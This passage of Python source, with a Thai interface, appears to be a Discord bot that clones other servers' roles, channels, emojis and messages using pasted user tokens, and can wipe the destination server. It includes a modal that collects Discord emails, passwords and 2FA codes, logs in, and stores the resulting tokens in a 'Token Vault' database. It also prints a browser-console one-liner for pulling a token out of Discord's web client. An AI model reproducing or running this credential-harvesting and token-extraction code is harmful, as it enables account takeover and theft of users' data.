            session, "GET", f"{base_url}/channels/{src_ch_id}/messages?limit={limit}", headers=headers
        )
        if s == 200 and isinstance(msgs, list):
            for msg in reversed(msgs):
                content = msg.get('content', '')
                for att in msg.get('attachments', []): content += f"\n{att.get('url', '')}"
                for st in msg.get('sticker_items', []): content += f"\nhttps://cdn.discordapp.com/stickers/{st['id']}.png"
                embeds = msg.get('embeds', [])
                if content.strip() or embeds:
                    author = msg.get('author', {})
                    name = author.get('username', 'User')
                    avatar = author.get('avatar')
                    avatar_url = f"https://cdn.discordapp.com/avatars/{author.get('id')}/{avatar}.png" if avatar else None
                    if webhook_url:
                        await DiscordRESTEngine.request_with_retry(
                            session, "POST", webhook_url,
                            json={"content": content, "embeds": embeds, "username": name, "avatar_url": avatar_url}
                        )
                    else:
                        await DiscordRESTEngine.request_with_retry(
                            session, "POST", f"{base_url}/channels/{dst_ch_id}/messages",
                            headers=headers, json={"content": content, "embeds": embeds}
                        )
                    await asyncio.sleep(0.4)

    @classmethod
    async def execute_orchestrated_clone(
        cls, it: discord.Interaction, user_token: str, src_id: str, dst_id: str, clean_mode: bool, msg_limit: int
    ):
        headers = DiscordRESTEngine.get_user_headers(user_token)
        raw_headers = {"Authorization": user_token.strip()}
        base_url = DiscordRESTEngine.BASE_URL
        ledger = ObligationLedger(src_id, dst_id)

        async with aiohttp.ClientSession() as session:
            # 1. Preflight authorization verification
            s, dst_info = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{dst_id}", headers=headers)
            if s != 200:
                return await it.followup.send("❌ **User Token ไม่ถูกต้อง** หรือไม่มีสิทธิ์ Administrator ในเซิร์ฟเวอร์ปลายทาง", ephemeral=True)

            status_msg = await it.followup.send(embed=ledger.render_embed("⏳ [1/7] กำลังตรวจสอบและสำรองข้อมูลเซิร์ฟเวอร์..."), ephemeral=True)

            # 2. Offline Snapshot Ingestion
            snapshot = await SnapshotEngine.create_snapshot_memory(session, headers, src_id)
            src_guild = snapshot.get("guild", {})
            r_roles = snapshot.get("roles", [])
            r_channels = snapshot.get("channels", [])
            r_emojis = snapshot.get("emojis", [])
            r_stickers = snapshot.get("stickers", [])
            r_bots = snapshot.get("bots", [])

            cat_list = [c for c in r_channels if c.get("type") == 4]
            ch_list = [c for c in r_channels if c.get("type") != 4]

            ledger.set_planned("roles", len([r for r in r_roles if r.get("name") != "@everyone" and not r.get("managed")]))
            ledger.set_planned("categories", len(cat_list))
            ledger.set_planned("channels", len(ch_list))
            ledger.set_planned("emojis", len(r_emojis))
            ledger.set_planned("stickers", len(r_stickers))
            ledger.set_planned("bots", len(r_bots))

            await status_msg.edit(embed=ledger.render_embed("⏳ [2/7] เริ่มต้นกระบวนการโคลนระบบ..."))

            # 3. Clean Destination Server if requested
            if clean_mode:
                for ep in ["channels", "roles", "emojis", "stickers"]:
                    s, items = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{dst_id}/{ep}", headers=headers)
                    if s == 200 and isinstance(items, list):
                        for item in items:
                            if ep == "roles" and (item.get('name') == "@everyone" or item.get('managed')): continue
                            del_url = f"{base_url}/channels/{item['id']}" if ep == "channels" else f"{base_url}/guilds/{dst_id}/{ep}/{item['id']}"
                            await DiscordRESTEngine.request_with_retry(session, "DELETE", del_url, headers=headers)
                            await asyncio.sleep(0.15)

            # 4. Clone Server Metadata (Icon, Banner, Splash, Settings)
            meta_payload: Dict[str, Any] = {
                "name": src_guild.get("name"),
                "description": src_guild.get("description"),
                "verification_level": src_guild.get("verification_level", 0),
                "default_message_notifications": src_guild.get("default_message_notifications", 0),
                "explicit_content_filter": src_guild.get("explicit_content_filter", 0),
                "afk_timeout": src_guild.get("afk_timeout", 300)
            }
            meta_semaphore = asyncio.Semaphore(3)
            icon_hash = src_guild.get("icon")
            if icon_hash:
                ext = "gif" if icon_hash.startswith("a_") else "png"
                meta_payload["icon"] = await DiscordRESTEngine.download_asset_base64(
                    session, f"https://cdn.discordapp.com/icons/{src_id}/{icon_hash}.{ext}", ext, meta_semaphore
                )
            banner_hash = src_guild.get("banner")
            if banner_hash:
                ext = "gif" if banner_hash.startswith("a_") else "png"
                meta_payload["banner"] = await DiscordRESTEngine.download_asset_base64(
                    session, f"https://cdn.discordapp.com/banners/{src_id}/{banner_hash}.{ext}", ext, meta_semaphore
                )
            splash_hash = src_guild.get("splash")
            if splash_hash:
                meta_payload["splash"] = await DiscordRESTEngine.download_asset_base64(
                    session, f"https://cdn.discordapp.com/splashes/{src_id}/{splash_hash}.png", "png", meta_semaphore
                )

            await DiscordRESTEngine.request_with_retry(session, "PATCH", f"{base_url}/guilds/{dst_id}", headers=headers, json=meta_payload)
            ledger.increment("meta")

            # 5. Clone Roles (Descending position order)
            role_map: Dict[str, str] = {}
            filtered_roles = [r for r in r_roles if r.get('name') != "@everyone" and not r.get('managed')]
            for role in sorted(filtered_roles, key=lambda x: x.get('position', 0), reverse=True):
                role_payload = {
                    "name": role.get('name'), "permissions": role.get('permissions'),
                    "color": role.get('color'), "hoist": role.get('hoist'), "mentionable": role.get('mentionable')
                }
                s, created_role = await DiscordRESTEngine.request_with_retry(session, "POST", f"{base_url}/guilds/{dst_id}/roles", headers=headers, json=role_payload)
                if s == 201 and isinstance(created_role, dict):
                    role_map[role['id']] = created_role['id']
                    ledger.increment("roles")
                await asyncio.sleep(0.35)

            # 6. Deep Bot Reverse Engineering & Code Generation
            await status_msg.edit(embed=ledger.render_embed("⏳ [3.5/7] กำลังทำ Black-Box Reverse Engineering สแกนคำสั่งและ UI บอท..."))
            reconstructed_bots = await BotReverseEngineeringEngine.reconstruct_guild_bots(
                session=session,
                headers=headers,
                guild_id=src_id,
                bots_members=r_bots,
                channels=ch_list
            )

            role_perm_map = {r['id']: int(r.get('permissions', 0)) for r in r_roles}
            for m in r_bots:
                user = m.get("user", {})
                bot_id = user.get("id")
                bot_name = user.get("username", "Bot")
                combined_perms = 0
                for rid in m.get("roles", []): combined_perms |= role_perm_map.get(rid, 0)
                if combined_perms == 0: combined_perms = 8

                invite_url = f"https://discord.com/oauth2/authorize?client_id={bot_id}&scope=bot%20applications.commands&permissions={combined_perms}"
                
                matched = next((item for item in reconstructed_bots if item[0] == bot_name), None)
                code_file = matched[1] if matched else f"cloned_{bot_name}.py"
                cmd_count = matched[3] if matched else 0

                ledger.bot_manifest.append({
                    "id": bot_id,
                    "name": bot_name,
                    "permissions": combined_perms,
                    "invite": invite_url,
                    "code_file": code_file,
                    "cmd_count": cmd_count
                })

                # Create Shadow Role for the Bot
                await DiscordRESTEngine.request_with_retry(
                    session, "POST", f"{base_url}/guilds/{dst_id}/roles", headers=headers,
                    json={"name": f"🤖 {bot_name}", "permissions": str(combined_perms), "color": 0x5865F2, "hoist": True}
                )
                ledger.increment("bots")
                await asyncio.sleep(0.2)

            await status_msg.edit(embed=ledger.render_embed("⏳ [4/7] กำลังโคลนอิโมจิและสติ๊กเกอร์ (Parallel Worker Pool)..."))

            # 7. Concurrent Worker Pool for Emojis
            asset_semaphore = asyncio.Semaphore(5)
            async def upload_single_emoji(emoji):
                try:
                    ext = "gif" if emoji.get('animated') else "png"
                    url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.{ext}"
                    b64_data = await DiscordRESTEngine.download_asset_base64(session, url, ext, asset_semaphore)
                    if b64_data:
                        s, _ = await DiscordRESTEngine.request_with_retry(
                            session, "POST", f"{base_url}/guilds/{dst_id}/emojis",
                            headers=headers, json={"name": emoji['name'], "image": b64_data}
                        )
                        if s in [200, 201]: ledger.increment("emojis")
                except Exception as e:
                    ledger.add_error(f"Emoji Error {emoji.get('name')}: {e}")

            await asyncio.gather(*[upload_single_emoji(em) for em in r_emojis])

            # Stickers
            for sticker in r_stickers:
                try:
                    async with session.get(f"https://cdn.discordapp.com/stickers/{sticker['id']}.png") as img_r:
                        if img_r.status == 200:
                            form = aiohttp.FormData()
                            form.add_field('name', sticker.get('name', 'sticker'))
                            form.add_field('tags', sticker.get('tags', 'sticker'))
                            form.add_field('file', await img_r.read(), filename="sticker.png", content_type='image/png')
                            s, _ = await DiscordRESTEngine.request_with_retry(session, "POST", f"{base_url}/guilds/{dst_id}/stickers", headers=raw_headers, data=form)
                            if s in [200, 201]: ledger.increment("stickers")
                except Exception: pass
                await asyncio.sleep(0.3)

            await status_msg.edit(embed=ledger.render_embed("⏳ [5/7] กำลังโคลนหมวดหมู่และช่องแชท..."))

            # 8. Clone Categories First
            cat_map: Dict[str, str] = {}
            for ch in sorted(cat_list, key=lambda x: x.get('position', 0)):
                cat_payload = {"name": ch.get('name'), "type": 4}
                s, created_cat = await DiscordRESTEngine.request_with_retry(session, "POST", f"{base_url}/guilds/{dst_id}/channels", headers=headers, json=cat_payload)
                if s == 201 and isinstance(created_cat, dict):
                    cat_map[ch['id']] = created_cat['id']
                    ledger.increment("categories")
                await asyncio.sleep(0.3)

            # 9. Clone Detailed Channels & Permissions Overwrites
            for ch in sorted(ch_list, key=lambda x: x.get('position', 0)):
                ch_type = ch.get('type', 0)
                ovs = []
                for ov in ch.get('permission_overwrites', []):
                    target_id = role_map.get(ov['id'], dst_id if ov['id'] == src_id else ov['id'])
                    ovs.append({"id": target_id, "type": ov.get('type', 0), "allow": ov.get('allow', '0'), "deny": ov.get('deny', '0')})

                ch_payload: Dict[str, Any] = {
                    "name": ch.get('name'), "type": ch_type,
                    "parent_id": cat_map.get(ch.get('parent_id')), "permission_overwrites": ovs
                }
                if ch.get('topic'): ch_payload["topic"] = ch.get('topic')
                if ch.get('nsfw') is not None: ch_payload["nsfw"] = ch.get('nsfw')
                if ch.get('rate_limit_per_user'): ch_payload["rate_limit_per_user"] = ch.get('rate_limit_per_user')
                if ch_type in (2, 13):
                    if ch.get('bitrate'): ch_payload["bitrate"] = ch.get('bitrate')
                    if ch.get('user_limit'): ch_payload["user_limit"] = ch.get('user_limit')

                s, created_ch = await DiscordRESTEngine.request_with_retry(session, "POST", f"{base_url}/guilds/{dst_id}/channels", headers=headers, json=ch_payload)
                if s == 201 and isinstance(created_ch, dict):
                    ledger.increment("channels")
                    if msg_limit > 0:
                        await cls.clone_messages_webhook(session, headers, ch['id'], created_ch['id'], msg_limit)
                await asyncio.sleep(0.35)

            # 10. Completed — Send Files to DM
            dm_files = []
            snap_json_bytes = json.dumps(snapshot, ensure_ascii=False, indent=2).encode("utf-8")
            dm_files.append(discord.File(io.BytesIO(snap_json_bytes), filename=f"snapshot_{src_id}.json"))

            if ledger.bot_manifest:
                invite_lines = [
                    f"==================================================",
                    f" DISCORD BOT INVITE REPORT (Server ID: {src_id})",
                    f" Generated: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
                    f" Total Bots Found: {len(ledger.bot_manifest)}",
                    f"==================================================\n"
                ]
                for b in ledger.bot_manifest:
                    invite_lines.append(f"🤖 Bot Name: {b['name']} (ID: {b['id']})")
                    invite_lines.append(f"🔑 Permissions: {b['permissions']}")
                    invite_lines.append(f"🔗 1-Click Invite URL: {b['invite']}\n")
                invite_file = discord.File(io.BytesIO("\n".join(invite_lines).encode("utf-8")), filename=f"bot_invites_{src_id}.txt")
                dm_files.append(invite_file)

            delivered_dm = False
            try:
                await it.user.send(
                    content=(
                        f"📦 **รายงานผลการโคลนและไฟล์สำรองข้อมูล**\n"
                        f"• โคลนจากเซิร์ฟเวอร์: `{src_id}` ➔ ปลายทาง: `{dst_id}`\n"
                        f"• แนบไฟล์: Snapshot JSON และรายงานลิงก์เชิญบอททั้งหมด"
                    ),
                    files=dm_files
                )
                delivered_dm = True
            except discord.Forbidden:
                delivered_dm = False

            final_embed = ledger.render_embed("✅ โคลนเซิร์ฟเวอร์และบอทเสร็จสมบูรณ์ 100%! 🎉", is_final=True)
            if delivered_dm:
                final_embed.add_field(name="📬 จัดส่งไฟล์ทางแชทส่วนตัว", value="ระบบได้ส่งไฟล์ Snapshot JSON และรายงานบอทไปยัง **DM ของคุณ** เรียบร้อยแล้วค่ะ!", inline=False)
            else:
                final_embed.add_field(name="⚠️ การส่งไฟล์ทาง DM", value="คุณปิดรับข้อความส่วนตัว จึงไม่สามารถส่งไฟล์เข้า DM ได้", inline=False)

            await status_msg.edit(embed=final_embed)

# ==============================================================================
# 5. MODALS & FORMS
# ==============================================================================
class AdvancedCloneModal(ui.Modal, title="⚡ โคลนเซิร์ฟเวอร์ & บอทเต็มระบบ"):
    token = ui.TextInput(label="User Token (ผู้ใช้)", placeholder="วาง User Token ของคุณที่นี่...", required=True)
    src   = ui.TextInput(label="Server ID ต้นทาง", placeholder="ไอดีเซิร์ฟเวอร์ที่ต้องการโคลน...", required=True)
    dst   = ui.TextInput(label="Server ID ปลายทาง", placeholder="ไอดีเซิร์ฟเวอร์ที่จะวางโครงสร้าง...", required=True)
    clean = ui.TextInput(label="ล้างข้อมูลเดิมในเซิร์ฟปลายทางหรือไม่?", placeholder='พิมพ์ "ใช่" เพื่อล้างทิ้ง / "ไม่" เพื่อสร้างทับ', required=True, min_length=2, max_length=3)
    limit = ui.TextInput(label="จำนวนข้อความต่อห้อง (0-100)", placeholder="0 = ไม่ดึงข้อความ", default="0", required=True, max_length=3)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try: msg_limit = max(0, min(100, int(self.limit.value)))
        except ValueError: msg_limit = 0
        clean_choice = self.clean.value.strip() == "ใช่"
        await EnterpriseCloneService.execute_orchestrated_clone(
            interaction, self.token.value, self.src.value, self.dst.value, clean_choice, msg_limit
        )

class BotOnlyCloneModal(ui.Modal, title="🤖 โคลนเฉพาะ Discord Bots"):
    token = ui.TextInput(label="User Token (ผู้ใช้)", placeholder="วาง User Token ของคุณที่นี่...", required=True)
    src   = ui.TextInput(label="Server ID ต้นทาง", placeholder="ไอดีเซิร์ฟเวอร์ที่ต้องการดึงบอท...", required=True)
    dst   = ui.TextInput(label="Server ID ปลายทาง", placeholder="ไอดีเซิร์ฟเวอร์ที่จะสร้างยศบอท...", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        headers = DiscordRESTEngine.get_user_headers(self.token.value)
        base_url = DiscordRESTEngine.BASE_URL

        async with aiohttp.ClientSession() as session:
            s, _ = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{self.dst.value}", headers=headers)
            if s != 200: return await interaction.followup.send("❌ **User Token ไม่ถูกต้อง** หรือไม่มีสิทธิ์ในดิสปลายทาง", ephemeral=True)

            status_msg = await interaction.followup.send("⏳ **[1/3] กำลังทำ Black-Box Reverse Engineering สแกนคำสั่งและสิทธิ์บอท...**", ephemeral=True)

            s, roles = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{self.src.value}/roles", headers=headers)
            r_roles = roles if (s == 200 and isinstance(roles, list)) else []

            s, channels = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{self.src.value}/channels", headers=headers)
            r_channels = channels if (s == 200 and isinstance(channels, list)) else []

            s, members = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{self.src.value}/members?limit=1000", headers=headers)
            if s != 200 or not isinstance(members, list):
                return await status_msg.edit(content="❌ ไม่สามารถดึงข้อมูลสมาชิกในเซิร์ฟเวอร์ต้นทางได้")

            bots = [m for m in members if m.get("user", {}).get("bot")]
            if not bots: return await status_msg.edit(content="⚠️ ไม่พบบอทในเซิร์ฟเวอร์ต้นทาง")

            await status_msg.edit(content=f"⏳ **[2/3] กำลังสังเคราะห์โค้ด Python สำหรับบอท {len(bots)} ตัว...**")
            reconstructed_bots = await BotReverseEngineeringEngine.reconstruct_guild_bots(
                session=session,
                headers=headers,
                guild_id=self.src.value,
                bots_members=bots,
                channels=r_channels
            )

            role_perm_map = {r['id']: int(r.get('permissions', 0)) for r in r_roles}
            bot_manifest = []

            for m in bots:
                user = m.get("user", {})
                bot_id = user.get("id")
                bot_name = user.get("username", "Bot")
                combined_perms = 0
                for rid in m.get("roles", []): combined_perms |= role_perm_map.get(rid, 0)
                if combined_perms == 0: combined_perms = 8

                invite_url = f"https://discord.com/oauth2/authorize?client_id={bot_id}&scope=bot%20applications.commands&permissions={combined_perms}"
                
                matched = next((item for item in reconstructed_bots if item[0] == bot_name), None)
                code_file = matched[1] if matched else f"cloned_{bot_name}.py"
                cmd_count = matched[3] if matched else 0

                bot_manifest.append({
                    "id": bot_id,
                    "name": bot_name,
                    "permissions": combined_perms,
                    "invite": invite_url,
                    "code_file": code_file,
                    "cmd_count": cmd_count
                })

                await DiscordRESTEngine.request_with_retry(
                    session, "POST", f"{base_url}/guilds/{self.dst.value}/roles", headers=headers,
                    json={"name": f"🤖 {bot_name}", "permissions": str(combined_perms), "color": 0x5865F2, "hoist": True}
                )
                await asyncio.sleep(0.2)

            # Build ZIP containing all cloned_*.py and report
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                for b_name, fname, f_bytes, _ in reconstructed_bots:
                    zf.writestr(f"reconstructed_bots/{fname}", f_bytes)
                
                report_lines = [
                    f"==================================================",
                    f" DISCORD BOT REVERSE ENGINEERING REPORT",
                    f" Server ID: {self.src.value}",
                    f" Total Bots Reconstructed: {len(reconstructed_bots)}",
                    f" Generated: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
                    f"==================================================\n"
                ]
                for b in bot_manifest:
                    report_lines.append(f"🤖 Bot: {b['name']} (ID: {b['id']})")
                    report_lines.append(f"📄 Python Script: {b['code_file']} ({b['cmd_count']} Slash Commands)")
                    report_lines.append(f"🔑 Permissions: {b['permissions']}")
                    report_lines.append(f"🔗 Invite: {b['invite']}\n")
                zf.writestr("reconstructed_bots/README_BOT_REPORT.txt", "\n".join(report_lines))
            zip_buffer.seek(0)

            delivered_dm = False
            try:
                await interaction.user.send(
                    content=f"🤖 **ไฟล์โค้ดบอทที่ผ่านการ Reverse Engineering สำเร็จ!** (เซิร์ฟ `{self.src.value}` รวม {len(reconstructed_bots)} บอท)",
                    file=discord.File(zip_buffer, filename=f"reconstructed_bots_{self.src.value}.zip")
                )
                delivered_dm = True
            except discord.Forbidden: delivered_dm = False

            embed = discord.Embed(title="✅ Black-Box Reverse Engineering สำเร็จ 100%!", color=0x57F287)
            embed.description = (
                f"• ถอดรหัสและสร้างโค้ดบอท: **{len(reconstructed_bots)} ตัว**\n"
                f"• จำลองคำสั่ง Slash Commands + UI Components ทั้งหมดออกมาเป็นไฟล์ `.py`\n"
                f"• บันทึกไฟล์ `cloned_<botname>.py` ลงเครื่องเรียบร้อยแล้ว"
            )
            if delivered_dm:
                embed.add_field(name="📬 ส่งไฟล์โค้ดเข้า DM", value="แพ็กเกจไฟล์ ZIP `.py` ทั้งหมดถูกส่งเข้า **DM ของคุณ** เรียบร้อยแล้วค่ะ!", inline=False)
            else:
                embed.add_field(name="⚠️ ปิด DM อยู่", value="คุณปิดรับข้อความส่วนตัว ไฟล์โค้ดถูกเซฟไว้ในโฟลเดอร์รันบอทแทน", inline=False)

            await status_msg.edit(content=None, embed=embed)

class SnapshotDownloadModal(ui.Modal, title="📦 ดูดไฟล์ Snapshot JSON สำรองข้อมูล"):
    token = ui.TextInput(label="User Token (ผู้ใช้)", placeholder="วาง User Token ของคุณที่นี่...", required=True)
    src   = ui.TextInput(label="Server ID ต้นทาง", placeholder="ไอดีเซิร์ฟเวอร์ที่ต้องการดูดข้อมูล...", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        headers = DiscordRESTEngine.get_user_headers(self.token.value)
        status_msg = await interaction.followup.send("⏳ **กำลังดึงโครงสร้างและสร้าง Snapshot JSON...**", ephemeral=True)

        async with aiohttp.ClientSession() as session:
            snapshot = await SnapshotEngine.create_snapshot_memory(session, headers, self.src.value)
            snap_bytes = json.dumps(snapshot, ensure_ascii=False, indent=2).encode("utf-8")

            delivered_dm = False
            try:
                await interaction.user.send(
                    content=f"📦 **ไฟล์สำรองข้อมูล Snapshot JSON:** `{self.src.value}` ({snapshot.get('guild', {}).get('name', 'Unknown')})",
                    file=discord.File(io.BytesIO(snap_bytes), filename=f"snapshot_{self.src.value}.json")
                )
                delivered_dm = True
            except discord.Forbidden: delivered_dm = False

            embed = discord.Embed(title="✅ สร้าง Snapshot สำเร็จ!", color=0x57F287)
            embed.add_field(name="📁 เซิร์ฟเวอร์", value=f"`{snapshot.get('guild', {}).get('name', 'Unknown')}`", inline=True)
            embed.add_field(name="👑 ยศ", value=f"`{len(snapshot.get('roles', []))}`", inline=True)
            embed.add_field(name="💬 ช่อง", value=f"`{len(snapshot.get('channels', []))}`", inline=True)
            embed.add_field(name="✨ อิโมจิ", value=f"`{len(snapshot.get('emojis', []))}`", inline=True)
            embed.add_field(name="🤖 บอท", value=f"`{len(snapshot.get('bots', []))}`", inline=True)
            if delivered_dm: embed.add_field(name="📬 ส่งไฟล์เข้า DM", value="ระบบได้ส่งไฟล์ `.json` เข้า **DM ของคุณ** เรียบร้อยแล้วค่ะ!", inline=False)
            else: embed.add_field(name="⚠️ ปิด DM อยู่", value="คุณปิดรับข้อความส่วนตัว จึงไม่สามารถส่งไฟล์เข้า DM ได้", inline=False)

            await status_msg.edit(content=None, embed=embed)

class PartCloneModal(ui.Modal, title="📋 โคลนเฉพาะส่วน"):
    def __init__(self, mode: str):
        super().__init__()
        self.mode = mode
        mode_names = {"ch": "ห้องและหมวดหมู่", "rl": "ยศ (Roles)", "em": "อิโมจิ (Emojis)"}
        self.title = f"📋 โคลนเฉพาะ: {mode_names.get(mode, mode)}"
        self.token = ui.TextInput(label="User Token", placeholder="วาง User Token ที่นี่...", required=True)
        self.src   = ui.TextInput(label="Server ID ต้นทาง", placeholder="ไอดีเซิร์ฟเวอร์ต้นทาง...", required=True)
        self.dst   = ui.TextInput(label="Server ID ปลายทาง", placeholder="ไอดีเซิร์ฟเวอร์ปลายทาง...", required=True)
        self.add_item(self.token); self.add_item(self.src); self.add_item(self.dst)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        headers = DiscordRESTEngine.get_user_headers(self.token.value)
        base_url = DiscordRESTEngine.BASE_URL
        async with aiohttp.ClientSession() as session:
            s, _ = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{self.dst.value}", headers=headers)
            if s != 200: return await interaction.followup.send("❌ **User Token ไม่ถูกต้อง** หรือไม่มีสิทธิ์ในดิสปลายทาง", ephemeral=True)
            await interaction.followup.send("⏳ **กำลังคัดลอกส่วนที่เลือก...**", ephemeral=True)

            if self.mode == "ch":
                s, chs = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{self.src.value}/channels", headers=headers)
                if s == 200 and isinstance(chs, list):
                    cat_map = {}
                    for ch in sorted(chs, key=lambda x: x.get('position', 0)):
                        if ch.get('type') == 4:
                            s_c, c_c = await DiscordRESTEngine.request_with_retry(session, "POST", f"{base_url}/guilds/{self.dst.value}/channels", headers=headers, json={"name": ch['name'], "type": 4})
                            if s_c == 201 and isinstance(c_c, dict): cat_map[ch['id']] = c_c['id']
                            await asyncio.sleep(0.3)
                    for ch in [c for c in chs if c.get('type') != 4]:
                        await DiscordRESTEngine.request_with_retry(session, "POST", f"{base_url}/guilds/{self.dst.value}/channels", headers=headers, json={"name": ch['name'], "type": ch['type'], "parent_id": cat_map.get(ch.get('parent_id'))})
                        await asyncio.sleep(0.3)
            elif self.mode == "rl":
                s, roles = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{self.src.value}/roles", headers=headers)
                if s == 200 and isinstance(roles, list):
                    for rl in sorted([r for r in roles if r.get('name') != "@everyone" and not r.get('managed')], key=lambda x: x.get('position', 0), reverse=True):
                        await DiscordRESTEngine.request_with_retry(session, "POST", f"{base_url}/guilds/{self.dst.value}/roles", headers=headers, json={"name": rl['name'], "permissions": rl['permissions'], "color": rl['color'], "hoist": rl['hoist']})
                        await asyncio.sleep(0.35)
            elif self.mode == "em":
                s, emojis = await DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{self.src.value}/emojis", headers=headers)
                if s == 200 and isinstance(emojis, list):
                    sem = asyncio.Semaphore(5)
                    for em in emojis:
                        ext = "gif" if em.get('animated') else "png"
                        b64_data = await DiscordRESTEngine.download_asset_base64(session, f"https://cdn.discordapp.com/emojis/{em['id']}.{ext}", ext, sem)
                        if b64_data:
                            await DiscordRESTEngine.request_with_retry(session, "POST", f"{base_url}/guilds/{self.dst.value}/emojis", headers=headers, json={"name": em['name'], "image": b64_data})
                        await asyncio.sleep(0.3)

            delivered_dm = False
            try:
                await interaction.user.send(content=f"✅ **การโคลนเฉพาะส่วน `{self.mode}` เสร็จสมบูรณ์!**\n• ต้นทาง: `{self.src.value}` ➔ ปลายทาง: `{self.dst.value}`")
                delivered_dm = True
            except discord.Forbidden: delivered_dm = False

            resp_text = "✅ **คัดลอกส่วนที่เลือกเสร็จสิ้น!**"
            if delivered_dm: resp_text += " 📬 (แจ้งเตือนไปยัง DM เรียบร้อย)"
            await interaction.followup.send(resp_text, ephemeral=True)

class TokenExtractorModal(ui.Modal, title="🔐 ดึง User Token ผ่านระบบ Login"):
    email    = ui.TextInput(label="อีเมล Discord / เบอร์โทร", placeholder="example@email.com หรือเบอร์โทร", required=True)
    password = ui.TextInput(label="รหัสผ่าน", placeholder="รหัสผ่านบัญชี Discord", style=discord.TextStyle.short, required=True)
    mfa_code = ui.TextInput(label="รหัส 2FA / รหัสสำรอง (ถ้ามี)", placeholder="ใส่รหัส Authenticator 6 หลัก หรือเว้นว่างได้", style=discord.TextStyle.short, required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        token, error = await DiscordRESTEngine.extract_token_from_login(self.email.value, self.password.value, self.mfa_code.value)
        if token:
            # Auto-save to vault
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36"}
                s, me_data = await DiscordRESTEngine.request_with_retry(session, "GET", f"{DiscordRESTEngine.V10_URL}/users/@me", headers=headers)
                u_id = me_data.get("id", "0") if s == 200 else "0"
                u_name = me_data.get("username", "Unknown") if s == 200 else "Unknown"
                await db.save_or_update_token(
                    token=token,
                    user_id=u_id,
                    username=u_name,
                    email=self.email.value,
                    phone="",
                    nitro="Verified via Login",
                    payment_methods="Stored",
                    admin_guilds=0,
                    total_guilds=0,
                    status="active"
                )

            embed = discord.Embed(title="✅ ดึง User Token สำเร็จ 100%!", color=0x57F287)
            embed.description = "ระบบได้เชื่อมต่อและถอดรหัส Token พร้อมบันทึกเข้าสู่ Token Vault อัตโนมัติ"
            embed.add_field(name="🔑 User Token", value=f"```\n{token}\n```", inline=False)
            embed.set_footer(text="🔒 บันทึกเข้า Token Vault เรียบร้อยแล้ว • ข้อมูลนี้แสดงเฉพาะคุณ")
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            reasons = {
                "verification": ("⚠️ ต้องยืนยันอีเมล Location", "Discord ส่งอีเมลยืนยันไปยังกล่องข้อความของคุณ กรุณากดยืนยันแล้วลองใหม่อีกครั้ง"),
                "password":     ("🔑 รหัสผ่านไม่ถูกต้อง", "โปรดตรวจสอบอีเมลหรือรหัสผ่านให้ถูกต้อง"),
                "2fa_required": ("🔐 บัญชีนี้เปิดระบบ 2FA", "กรุณากรอกรหัส Authenticator 6 หลักในช่อง 'รหัส 2FA' แล้วกดส่งอีกครั้ง"),
                "2fa_invalid":  ("❌ รหัส 2FA ไม่ถูกต้อง", "รหัส 2FA หรือ Backup Code ไม่ถูกต้อง หรือหมดอายุแล้ว"),
                "ratelimit":    ("⏳ ถูกจำกัดอัตราคำขอ", "มีการล็อกอินบ่อยเกินไป กรุณารอ 2-5 นาทีแล้วลองใหม่"),
            }
            if error == "captcha":
                emb = discord.Embed(
                    title="🧩 ตรวจพบ Cloudflare CAPTCHA บนเว็บ Discord",
                    description=(
                        "เนื่องจาก Discord ล็อกอินทาง API ติด CAPTCHA คุณสามารถดึง Token ได้โดยตรงใน 2 วินาทีผ่าน Console บนเบราว์เซอร์:\n\n"
                        "**วิธีดึง Token ตรงจาก Discord Web (PC):**\n"
                        "1. เปิดเว็บ Discord ในเบราว์เซอร์ (Chrome / Edge / Firefox) แล้วล็อกอิน\n"
                        "2. กดปุ่ม `F12` หรือ `Ctrl + Shift + I` แล้วไปที่แท็บ **Console**\n"
                        "3. ก๊อปปี้โค้ดด้านล่างนี้ วางลงไปแล้วกด `Enter`:\n"
                        "```javascript\n"
                        "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()\n"
                        "```\n"
                        "4. โทเคนจะปรากฏขึ้นมาทันที สามารถนำมาวางในช่อง **ตรวจสอบ Token** ได้เลยค่ะ!"
                    ),
                    color=0xFEE75C
                )
                await interaction.followup.send(embed=emb, ephemeral=True)
            else:
                title, desc = reasons.get(error, ("❌ ไม่สามารถดึง Token ได้", f"สาเหตุ: {error}"))
                await interaction.followup.send(embed=discord.Embed(title=title, description=desc, color=0xED4245), ephemeral=True)

class TokenInspectorModal(ui.Modal, title="🔍 ตรวจสอบและบันทึกข้อมูล Token"):
    token = ui.TextInput(label="User Token", placeholder="วาง Token ที่ต้องการตรวจสอบ...", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        raw_token = self.token.value.strip()
        headers = {
            "Authorization": raw_token,
